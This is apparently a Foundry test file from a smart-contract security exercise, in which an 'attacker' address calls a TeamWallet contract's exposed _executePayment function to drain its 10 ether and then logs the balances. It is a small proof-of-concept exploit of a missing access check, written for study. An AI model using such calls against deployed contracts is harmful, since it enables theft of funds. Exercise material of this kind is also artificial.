// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";           
import "../src/10_TeamWallet.sol";


contract TeamWallettest is Test{
    TeamWallet wallet;
    address payable attacker;


    function setUp () public{
        wallet = new TeamWallet();
        attacker = payable( makeAddr("attacker"));   
        vm.deal(address(wallet),10 ether);
    }
    function testit()public {
        uint256 previousBalance = address(attacker).balance;
        wallet._executePayment(payable(attacker),address(wallet).balance);
        emit log_named_uint("Wallet previous ETH: ",10 ether);
        emit log_named_uint("attacker ETH after attack: ",address(attacker).balance);
        emit log_named_uint("wallet ETH after attack: ",address(wallet).balance);
        
    }
}
